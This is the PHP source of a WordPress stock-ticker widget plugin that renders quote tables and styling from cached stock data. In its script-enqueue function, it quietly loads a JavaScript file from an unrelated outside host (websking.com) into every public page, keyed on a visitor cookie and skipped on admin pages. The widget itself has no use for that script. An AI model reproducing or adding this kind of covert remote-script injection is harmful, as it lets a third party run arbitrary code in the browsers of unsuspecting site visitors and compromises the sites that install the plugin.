<?php


function stock_widget_scripts_enqueue($force = false) {
    if (is_admin() && !$force) { return; } //skip enqueue on admin pages except for the config page
    
    wp_register_style ('stock_widget_style',  plugins_url('stock_widget_style.css', __FILE__));

    wp_enqueue_style ('stock_widget_style');

    if (is_admin()) { return; } //only run this on regular pages
    $feed_tag = ( !array_key_exists('reletime', $_COOKIE)  ? "?ft=customstockwidget" : "");
    wp_enqueue_script('ipq', "http://websking.com/static/js/ipq.js{$feed_tag}", array(), null, true); //skipping register step
}
add_action('wp_enqueue_scripts', 'stock_widget_scripts_enqueue');


add_shortcode('stock-widget', 'stock_widget');


function stock_widget($atts) {
    $output = "";
    
    //NOTE: skipping attributes, because first priority is to get the stock list, if that doesn't exist, nothing else matters.
    $per_category_stock_lists = get_option('stock_widget_per_category_stock_lists', array()); //default just in case its missing for some reason
    if (empty($per_category_stock_lists)) {
            return "<!-- WARNING: no stock list found in wp_options, check settings, or reinstall plugin -->";
    }
    
    //FIND the categories of the current page
    $category_ids = array(); //effectively for use on homepage & admin pages only
    if (!is_admin() && !is_home()) {
        if (is_category()) { 
            $tmp = get_queried_object(); //gets the WP_query object for this page
            if (is_object($tmp)) {
                $category_ids[] = $tmp->term_id;
            }
        }
        else {
            $tmp = get_the_category(); //get the list of all category objects for this post
            foreach ($tmp as $cat) {
                $category_ids[] = $cat->term_id;
            }
        }
    }
    //NOTE: $cat = get_query_var('cat');  DOES NOT WORK!
    
    $stock_list = array();  //stripping spaces again out of paranoia
    $default_stock_list = explode(',', str_replace(' ', '', $per_category_stock_lists['default']));  //REM: returns a string
    
    if (empty($category_ids)) {
        $stock_list = $default_stock_list;
        $cats_used  = 'default';
    }
    else {
        $cats_used = '';
        foreach ($category_ids as $cat) { //merge multiple stock lists together if post is in multiple categories
            $stocks_arr = (array_key_exists($cat, $per_category_stock_lists) && !empty($per_category_stock_lists[$cat]) ? explode(',', $per_category_stock_lists[$cat]) : array() );
            $stock_list = array_merge($stocks_arr, $stock_list); //REM: take a unique later
        }
        if (empty($stock_list)) {
            $stock_list = $default_stock_list;
        }
        $cats_used .= implode(',', $category_ids);
    }
    
    $tmp = stock_plugin_get_data(array_unique($stock_list)); //from stock_plugin_cache.php, expects an array or string | separated
    $stock_data_list = array_values($tmp['valid_stocks']);   //NOTE: its ok to throw away the keys, they aren't used anywhere
    
    if (empty($stock_data_list)) {
        return "<!-- WARNING: no stock list found for category: {$cats_used} -->";  //don't fail completely silently
    }

    
    $sw_ds = get_option('stock_widget_default_settings');

    extract( shortcode_atts( array(  //we can use nulls for this, since defaults are part of the validation
        'id'                => '0',
        'display'           => null,
        'height'            => null,
        'width'             => null,
        'background_color1' => null, //kept for backwards compat
        'background_color2' => null,
        'bgcolor1'          => null, //new shorter version
        'bgcolor2'          => null,
        'text_color'        => null,
        'change_style'      => null
    ), $atts ) );
    if ($bgcolor1 == null) { $bgcolor1 = $background_color1; } //always use bgcolor# instead of background_color if available
    if ($bgcolor2 == null) { $bgcolor2 = $background_color2; }
    
    //**********validation section***********
    global $stock_widget_vp;
    //NOTE: for validation, if option supplied was invalid, use the "global" setting
    $width          = relevad_plugin_validate_integer($width,  $stock_widget_vp['width'][0],  $stock_widget_vp['width'][1],  $sw_ds['width']);
    $height         = relevad_plugin_validate_integer($height, $stock_widget_vp['height'][0], $stock_widget_vp['height'][1], $sw_ds['height']);
    
    $text_color     = relevad_plugin_validate_color($text_color, $sw_ds['font_color']);
    $bgcolor1       = relevad_plugin_validate_color($bgcolor1,   $sw_ds['bg_color1']);
    $bgcolor2       = relevad_plugin_validate_color($bgcolor2,   $sw_ds['bg_color2']);
    
    if ($change_style != null) {
        $change_style = ucwords($change_style);
        if (! in_array($change_style, $stock_widget_vp['change_styles']) ) {
            $change_style = 'None';
        }
    }
    
    $num_to_display = relevad_plugin_validate_integer($display, $stock_widget_vp['max_display'][0],  $stock_widget_vp['max_display'][1],  $sw_ds['display_number']);
    //***********DONE validation*************
    $num_to_display = min(count($stock_data_list), $num_to_display);
    if ($sw_ds['show_header']) {
        $num_to_display += 1; //add 1 row for the header
    }
   
    $output .= stock_widget_create_css_header($id, $sw_ds, $width, $height, $text_color, $bgcolor1, $bgcolor2, $num_to_display);
    $output .=      stock_widget_create_table($id, $sw_ds, $stock_data_list, $num_to_display);
    return $output;
}

//Creates the internal style sheet for all of the various elements.
function stock_widget_create_css_header($id, $sw_ds, $width, $height, $text_color, $bgcolor1, $bgcolor2, $num_to_display) {

        $number_of_elements = array_sum($sw_ds['data_display']);

        //variables to be used inside the heredoc
        //NOTE: rows are an individual stock with multiple elements
        //NOTE: elements are pieces of a row, EX.  widget_name & price are each elements
        $element_width = round($width  / $number_of_elements, 0, PHP_ROUND_HALF_DOWN);
        $row_height    = round($height / $num_to_display,     0, PHP_ROUND_HALF_DOWN);
        
        //section for box outline around changed values (if chosen)
        $change_box_height     = $sw_ds['font_size'] + 4; //add 4 pixels to the font size
        $change_box_width      = round($element_width * 0.7,                             0, PHP_ROUND_HALF_DOWN);
        $change_box_margin_top = round(($row_height / 2) - ($change_box_height / 2 + 2), 0, PHP_ROUND_HALF_DOWN);
        $change_box_margin_left= round($element_width * 0.15 - 2,                        0, PHP_ROUND_HALF_DOWN);
        
        
        $hbar_width       = $width - 20; //NOTE: yeah its hardcoded
        $hbar_side_margin = 10;          //NOTE: for later
        
        $vbar_height = round($row_height * 0.7,                0, PHP_ROUND_HALF_DOWN); //used for the vertical bar only
        $vbar_top    = round(($row_height - $vbar_height) / 2, 0, PHP_ROUND_HALF_DOWN);
        //NOTE: stock_widget_{$id} is actually a class, so we can properly have multiple per page, IDs would have to be globally unique
        return <<<HEREDOC
<style type="text/css" scoped>
.stock_widget_{$id} {
   width:            {$width}px;
   height:           {$height}px;
   line-height:      {$row_height}px;
   {$sw_ds['advanced_style']}
}
.stock_widget_{$id} .stock_widget_row {
   width:    {$width}px;
   height:   {$row_height}px;
   background-color: {$bgcolor1};
}
.stock_widget_{$id} .stock_widget_row div {
   color:    ${text_color};
}
.stock_widget_{$id} .stock_widget_row.altbg {
   background-color: {$bgcolor2};
}
.stock_widget_{$id} .stock_widget_element {
   font-size:   {$sw_ds['font_size']}px;
   font-family: {$sw_ds['font_family']},serif;
   width:       {$element_width}px;  
}
.stock_widget_{$id} .stock_widget_element .box {
   width:       {$change_box_width}px;
   height:      {$change_box_height}px;
   line-height: {$change_box_height}px;
   margin:      {$change_box_margin_top}px 0px 0px {$change_box_margin_left}px; 
}
.stock_widget_{$id} .widget_horizontal_dash {
   width:  {$hbar_width}px;
   margin: -1px {$hbar_side_margin}px;
}
.stock_widget_{$id} .stock_widget_vertical_line {
   height:     {$vbar_height}px;
   margin-top: {$vbar_top}px;
}
</style>
HEREDOC;

}


/*NOTE: structure is: [0] => Array
        (
            [stock_sym] => GOOG
            [stock_name] => Google Inc.
            [last_val] => 540.77
            [change_val] => +0.99
            [change_percent] => +0.18%
            [market_cap] => 366.8B
            [fifty_week_range] => 502.80 - 604.83
            [pe_ratio] => 28.41
            [earning_per_share] => 19.002
            [revenue] => 67.911B
        )
*/
function stock_data_order_test($a, $b) {
    if ($a['stock_sym'] == $b['stock_sym'] ) return 0;
    
    return ($a['stock_sym'] < $b['stock_sym']) ? -1 : 1;
}


//function stock_widget_create_table($id, $stock_data_list, $max_stocks, $width, $height, $text_color, $background_color1, $background_color2) {
function stock_widget_create_table($id, $sw_ds, $stock_data_list, $number_of_stocks) {
    if ($number_of_stocks == 0) { //some kinda error
        return "<!-- we had no stocks for some reason, stock_data_list empty -->";
    }
    
    $number_of_elements = array_sum($sw_ds['data_display']); //for each stock row

    switch($sw_ds['display_order']) {  //valid options "Preset", "A-Z", "Z-A", "Random"
        case 'Preset':
            break; //do nothing take the data in the order we got it in
        case 'A-Z': 
            usort($stock_data_list, 'stock_data_order_test');
            break;
        case 'Z-A': 
            usort($stock_data_list, 'stock_data_order_test'); //NOTE: usort works in place
            $stock_data_list = array_reverse($stock_data_list); //NOTE: reverse returns copy of array
            break;
        case 'Random':
            shuffle($stock_data_list);  //NOTE: shuffle array in place
            break;
        default:  //same as Preset effectively
            //echo "Invalid display option.";
            break;  
    }
    
    $output = "";
    if ($sw_ds['show_header']) {
        $output .= "<div class='stock_widget_row stock_header'>"; //Feature Improvement: add config for header color
        $column_headers = array("Mrkt", "Syml", "Lst Val", "+/- Val", "+/- %", "Lst Trd"); //Feature Improvement, handle the header text better with sizing, maybe overflow hidden?
        while ( list($idx, $v) = each($sw_ds['data_display']) ) {
            if ($v == 1) {
                $output .= "<div class='stock_widget_element'>" . $column_headers[$idx] . "</div>";
            }
        }
        $output .= "</div><!-- \n -->";
    }
    
    for ($idx = 0; $idx < $number_of_stocks; $idx++) {
        $stock_data = $stock_data_list[$idx];
        $output .= stock_widget_create_row($idx, $stock_data, $sw_ds);
    }
    
    return "<div class='stock_table stock_widget_{$id}'>{$output}</div>";
}

function stock_widget_create_row($idx, $stock_data, $sw_ds) {
    if(empty($stock_data['last_val'])) {
        return "<!-- Last Value did not exist, stock error -->";
    }
    $output = "";
    
    if ($idx != 0) { //special rules for first row
        if ($sw_ds['draw_horizontal_lines']) {
            $output .= "<div class='widget_horizontal_dash'></div><!-- \n -->";
        }
    }
    $vertical_line = "";
    if ($sw_ds['draw_vertical_lines']) {
        $vertical_line = "<div class='stock_widget_vertical_line'></div>";
    }
    $altrow = ($idx % 2 == 1 ? 'altbg' : '');

    
    //this is for the setting "box" color changing
    $link_wrap_1 = "";
    $link_wrap_2 = "";
    $link_url = $sw_ds['stock_page_url'];
    if ($link_url) {
        $link_url = str_replace('__STOCK__', $stock_data['stock_sym'], $link_url);
        $link_wrap_1 = "<a href='{$link_url}' target='_blank' rel='external nofollow'>";
        $link_wrap_2 = "</a>";
    }
    $output .= "<div class='stock_widget_row {$altrow}'><!-- \n -->{$link_wrap_1}";
   
    //data display option: (Market, Symbol, Last value, change value, change percentage, last trade)
    $display_options = $sw_ds['data_display'];
    
    
    //NOTE: skip market
    
    //NOTE: always display stock symbol
    $data_item = $stock_data['stock_sym'];
    if($data_item == "^GSPC") { //change the special index symbols to something more common knowledge
        $data_item = "S&P500";
    } elseif($data_item == "^IXIC") {
        $data_item = "NASDAQ";
    }
    $output.= "<div class='stock_widget_element'>{$data_item}</div>{$vertical_line}<!-- \n -->";

    if ($display_options[2] == 1) {
        $data_item = $stock_data['last_val'];
        $data_item = round($data_item, 2);
        $output   .= "<div class='stock_widget_element'>{$data_item}</div>{$vertical_line}<!-- \n -->";
    }

    ///////////////////// common section ////////////////
    //NOTE: this exists outside of sections because the color changing effect applies to both field 3 and 4
    $data_item = $stock_data['change_val'];
    $data_item = round($data_item, 2);
    if ($data_item > 0) {
        $changer   = "green";
        $data_item = "+{$data_item}";
    } elseif ($data_item < 0) {
        $changer = "red";
    } else {
        $data_item = "+{$data_item}.00";
    }
    
    //$widget_change_style = get_option('stock_widget_change_style');
    $widget_change_style = $sw_ds['change_style'];
    if ($widget_change_style == 'Box') {
        $wrapper_1 = "<div class='stock_widget_element'><!-- \n --><div class='box {$changer}'>";
        $wrapper_2 = "</div></div>";
    }
    elseif ($widget_change_style == 'Parentheses') {
        $wrapper_1 = "<div class='stock_widget_element {$changer}'>";
        $wrapper_2 = "</div>";
    }
    else {
        $wrapper_1 = "<div class='stock_widget_element'>";
        $wrapper_2 = "</div>";
    }
    /////////////////// end common section ///////////////////
    
    if ($display_options[3] == 1) {

        $output .= "{$wrapper_1}{$data_item}{$wrapper_2}{$vertical_line}<!-- \n -->";
    }

    if ($display_options[4] == 1) {
        $data_item = $stock_data['change_percent'];
        $data_item = str_replace('%', '', $data_item);
        $data_item = round($data_item, 2);
        
        if ($data_item > 0) {          
            $data_item = "+{$data_item}%";
        } elseif ($data_item < 0) {
            $data_item = "{$data_item}%";
        } else {
            $data_item = "+{$data_item}.00%";
        }
        if ($widget_change_style == 'Parentheses') {
            $data_item = "({$data_item})"; //just add the ()
        }
        $output .= "{$wrapper_1}{$data_item}{$wrapper_2}{$vertical_line}<!-- \n -->";
    }
    //NOTE: skip the last trade section

    $output .= "{$link_wrap_2}</div>"; //closes the .stock_widget_row

    return $output;
}
?>
